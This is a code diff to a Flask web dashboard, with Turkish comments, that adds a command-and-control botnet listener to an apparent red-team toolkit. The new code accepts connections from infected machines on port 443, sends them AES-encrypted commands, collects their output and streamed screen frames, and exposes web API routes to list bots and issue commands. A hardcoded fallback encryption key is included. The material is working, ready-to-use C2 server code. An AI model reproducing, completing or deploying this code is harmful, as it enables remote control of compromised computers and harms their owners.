@@ -242,7 +242,6 @@ def api_run():
             import RedTeam_C2
             import threading
             
-            # C2 Builder'ı arka planda thread olarak başlat
             def build_thread():
                 RedTeam_C2.c2_payload_builder(
                     auto_lhost=lhost,
@@ -269,6 +268,132 @@ def api_run():
         return jsonify({"status": "error", "output": "İşlem 120 saniyeyi aştığı için sonlandırıldı."})
     except Exception as e:
         return jsonify({"status": "error", "output": f"Hata oluştu:\n{traceback.format_exc()}"})
+
+# ================= C2 BOTNET LISTENER =================
+connected_bots = {}
+c2_listener_running = False
+
+def bot_handler(bot_id, client_socket, aes_key):
+    import base64
+    from Crypto.Cipher import AES
+    from Crypto.Util.Padding import unpad
+    
+    bot = connected_bots[bot_id]
+    
+    while True:
+        buffer = b""
+        try:
+            while not buffer.endswith(b"\n"):
+                chunk = client_socket.recv(4096)
+                if not chunk: break
+                buffer += chunk
+            if not buffer: break
+            
+            try:
+                raw = base64.b64decode(buffer.strip())
+                iv = raw[:16]
+                ct = raw[16:]
+                cipher = AES.new(aes_key, AES.MODE_CBC, iv)
+                plain = unpad(cipher.decrypt(ct), AES.block_size)
+                
+                # Check if it's a stream frame
+                if plain.startswith(b"[STREAM_FRAME] "):
+                    bot["stream_frame"] = plain.split(b" ", 1)[1].decode('utf-8')
+                else:
+                    bot["output"].append(plain.decode('utf-8', errors='replace'))
+            except:
+                bot["output"].append(buffer.decode('utf-8', errors='replace'))
+        except:
+            break
+            
+    if bot_id in connected_bots:
+        del connected_bots[bot_id]
+
+def start_c2_listener_thread(port):
+    import socket
+    import threading
+    global c2_listener_running
+    
+    try:
+        with open(os.path.join(base_dir, "c2_aes_key.txt"), "r") as f:
+            aes_key = f.read().strip().encode('utf-8')
+    except:
+        aes_key = b"12345678901234567890123456789012" # Fallback
+        
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind(('0.0.0.0', int(port)))
+        s.listen(10)
+        c2_listener_running = True
+        
+        while True:
+            client, addr = s.accept()
+            bot_id = f"{addr[0]}_{addr[1]}"
+            connected_bots[bot_id] = {
+                "ip": addr[0],
+                "port": addr[1],
+                "socket": client,
+                "key": aes_key,
+                "output": [],
+                "stream_frame": ""
+            }
+            threading.Thread(target=bot_handler, args=(bot_id, client, aes_key), daemon=True).start()
+    except Exception as e:
+        print(f"C2 Listener Error: {e}")
+        c2_listener_running = False
+
+@app.route('/api/c2/start', methods=['POST'])
+def api_c2_start():
+    global c2_listener_running
+    if c2_listener_running:
+        return jsonify({"status": "error", "message": "Listener is already running."})
+        
+    port = request.json.get('port', 443)
+    import threading
+    threading.Thread(target=start_c2_listener_thread, args=(port,), daemon=True).start()
+    return jsonify({"status": "success", "message": f"C2 Listener started on port {port}"})
+
+@app.route('/api/c2/bots', methods=['GET'])
+def api_c2_bots():
+    bots_list = []
+    for bid, bdata in connected_bots.items():
+        bots_list.append({"id": bid, "ip": bdata["ip"], "port": bdata["port"]})
+    return jsonify({"status": "success", "bots": bots_list, "running": c2_listener_running})
+
+@app.route('/api/c2/send_cmd', methods=['POST'])
+def api_c2_send_cmd():
+    import base64
+    from Crypto.Cipher import AES
+    from Crypto.Util.Padding import pad
+    
+    data = request.json
+    bot_id = data.get('bot_id')
+    cmd = data.get('cmd', '').strip()
+    
+    if bot_id not in connected_bots:
+        return jsonify({"status": "error", "message": "Bot not found or disconnected."})
+        
+    bot = connected_bots[bot_id]
+    try:
+        cipher = AES.new(bot["key"], AES.MODE_CBC)
+        ct_bytes = cipher.encrypt(pad(cmd.encode('utf-8'), AES.block_size))
+        enc_cmd = base64.b64encode(cipher.iv + ct_bytes)
+        
+        bot["socket"].send(enc_cmd + b"\n")
+        return jsonify({"status": "success"})
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)})
+
+@app.route('/api/c2/output/<bot_id>', methods=['GET'])
+def api_c2_output(bot_id):
+    if bot_id not in connected_bots:
+        return jsonify({"status": "error", "message": "Bot disconnected."})
+        
+    bot = connected_bots[bot_id]
+    out = "".join(bot["output"])
+    bot["output"] = [] # Clear buffer after reading
+    stream = bot.get("stream_frame", "")
+    return jsonify({"status": "success", "output": out, "stream_frame": stream})
 
 def start_web_server(port=5000):
     print(f"\n\033[92m[*] Premium Web Dashboard Başlatılıyor...\033[0m")
